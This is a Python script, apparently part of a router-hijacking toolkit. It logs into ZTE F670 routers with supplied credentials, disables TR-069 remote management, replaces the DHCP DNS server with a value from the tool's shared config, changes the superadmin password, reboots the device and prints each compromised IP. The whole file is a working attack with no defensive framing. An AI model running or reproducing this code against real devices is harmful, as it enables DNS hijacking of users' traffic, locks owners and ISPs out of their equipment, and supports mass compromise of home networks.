import re
from base64 import b64encode
from hashlib import sha256

import requests

from shared import DNS
from shared import get_pass
from shared import parse
from shared import TIMEOUT


def zte_F670(full_string):
    try:
        ip, username, password = parse(full_string)
    except ValueError:
        return False

    s = requests.Session()
    try:
        r = s.get(f'http://{ip}', timeout=TIMEOUT)
        r.raise_for_status()
        if 'F670' not in r.text:
            return False
        login_token = re.findall(r'creatHiddenInput\("Frm_Logintoken", "(\d+)"\)', r.text)[0]
        login_check_token = re.findall(r'creatHiddenInput\("Frm_Loginchecktoken","(\d+)"\)', r.text)[0]
    except (requests.RequestException, IndexError):
        return False

    r = s.post(f'http://{ip}/', {
        'action': 'login',
        'Username': username,
        'Password': sha256(password.encode() + b'49987469').hexdigest(),
        'Frm_Logintoken': login_token,
        'UserRandomNum': '49987469',
        'Frm_Loginchecktoken': login_check_token
    }, timeout=TIMEOUT)
    try:
        r.raise_for_status()
    except requests.RequestException:
        return False
    if '/start.ghtml' not in r.url:
        return False

    r = s.get(f'http://{ip}/getpage.gch?pid=1002&nextpage=net_tr069_basic_t.gch', timeout=TIMEOUT)
    token = re.findall(r'var session_token = "(\d+)"', r.text)[0]
    s.post(f'http://{ip}/getpage.gch?pid=1002&nextpage=net_tr069_basic_t.gch', {
        'Tr069Enable': '0',
        'IF_ACTION': 'apply',
        'IF_ERRORSTR': 'SUCC',
        'IF_ERRORPARAM': 'SUCC',
        'IF_ERRORTYPE': '-1',
        'IF_PAGE': '',
        '_SESSION_TOKEN': token
    }, timeout=TIMEOUT).raise_for_status()

    r = s.get(f'http://{ip}/getpage.gch?pid=1002&nextpage=net_dhcp_dynamic_t.gch', timeout=TIMEOUT)
    token = re.findall(r'var session_token = "(\d+)"', r.text)[0]
    s.post(f'http://{ip}/getpage.gch?pid=1002&nextpage=net_dhcp_dynamic_t.gch', {
        'DNSServer1': DNS,
        'DNSServer2': '',
        'DNSServer3': '',
        'DnsServerSource': '0',
        'ISPDnsServerSource': 'NULL',
        'IF_ACTION': 'apply',
        'IF_ERRORSTR': 'SUCC',
        'IF_ERRORPARAM': 'SUCC',
        'IF_ERRORTYPE': '-1',
        'IF_PAGE': '',
        '_SESSION_TOKEN': token
    }, timeout=TIMEOUT).raise_for_status()

    r = s.get(f'http://{ip}/getpage.gch?pid=1002&nextpage=pon_manager_supuser_conf_t.gch', timeout=TIMEOUT)
    token = re.findall(r'var session_token = "(\d+)"', r.text)[0]
    login_random = re.findall(r'var login_random = (\d+)', r.text)[0]
    new_pass = get_pass()
    s.post(f'http://{ip}/getpage.gch?pid=1002&nextpage=pon_manager_supuser_conf_t.gch', {
        'Username': 'superadmin',
        'OldPassword': sha256(password.encode() + login_random.encode()).hexdigest(),
        'Password': b64encode(new_pass.encode()).decode(),
        'IF_ACTION': 'apply',
        'IF_ERRORSTR': 'SUCC',
        'IF_ERRORPARAM': 'SUCC',
        'IF_ERRORTYPE': '-1',
        'IF_PAGE': '',
        '_SESSION_TOKEN': token
    }, timeout=TIMEOUT).raise_for_status()

    r = s.get(f'http://{ip}/getpage.gch?pid=1002&nextpage=pon_manager_supuser_conf_t.gch', timeout=TIMEOUT)
    token = re.findall(r'var session_token = "(\d+)"', r.text)[0]
    try:
        s.post(f'http://{ip}/getpage.gch?pid=1002&nextpage=pon_manager_supuser_conf_t.gch', {
            'IF_ACTION': 'devrestart',
            'IF_ERRORSTR': 'SUCC',
            'IF_ERRORPARAM': 'SUCC',
            'IF_ERRORTYPE': '-1',
            'IF_PAGE': '',
            'flag': '1',
            '_SESSION_TOKEN': token
        }, timeout=TIMEOUT).raise_for_status()
    except requests.exceptions.ReadTimeout:
        pass

    print(ip)
    return True
